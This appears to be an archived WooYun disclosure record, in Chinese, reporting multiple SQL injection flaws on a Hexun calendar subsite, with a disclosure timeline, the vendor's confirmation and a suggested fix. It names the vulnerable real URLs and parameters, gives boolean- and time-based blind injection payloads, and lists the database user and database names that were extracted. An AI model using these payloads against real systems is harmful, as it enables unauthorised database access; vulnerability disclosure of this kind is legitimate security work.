{"id": 19134, "wybug_id": "wooyun-2015-0116228", "wybug_title": "和讯网某站多枚SQL注入", "wybug_corp": "和讯网", "wybug_author": "大懒", "wybug_date": "2015-05-26 10:18", "wybug_open_date": "2015-07-10 10:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向公众公开  简要描述： 和讯网某站多枚mssql注入 详细说明：  URL:http://calendar.hexun.com/client/FData/Default.aspx?keydata=1&page=1 受影响参数是 keydata这里存在查询类盲注 %' and '%'='还存在时间盲注 'waitfor delay '0:0:0' --因此需要过滤单引号、百分号及关键字其他存在问题的URL如下：POST:http://calendar.hexun.com/client/FData/     enddate=01/01/1967&keydata=1&keyevent=%ca%e4%c8%eb%b9%d8%bc%fc%b4%ca&startdate=01/01/1967(keydata)http://calendar.hexun.com/client/FData/default.aspx?keydata=1&page=1(keydata)http://calendar.hexun.com/client/FEvent/(keyevent)http://calendar.hexun.com/client/FEvent/Default.aspx(keyevent) 这里是另外的一种类型布尔盲注http://calendar.hexun.com/client/Chart.aspx?ct=2&et=54&seq=83812 存在问题参数 ct 及 etand 1=1这里没有使用字符串形式的参数，可能需要过滤关键字了 and 、or、&&、=等   漏洞证明：  current user:    'webdbo'available databases [14]:[*] DB_ANOTHER[*] DB_BASE[*] DB_FORECAST[*] DB_GOLD[*] DB_OTHER[*] DB_SMART[*] DB_VALUEADD[*] DB_VE@TURE[*] DB_WEB[*] distribution[*] master[*] model[*] msdb[*] tempdb   修复方案：  过滤结构化sql查询语句，数据与指令分离   版权声明：转载请注明来源 大懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-26 10:20 厂商回复： 处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-26 10:28 |    \t\t大懒 \t\t\t( 普通白帽子  |\t\t\t        Rank:239 漏洞数:45        )\t\t \n  确认的好快啊，分分钟！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}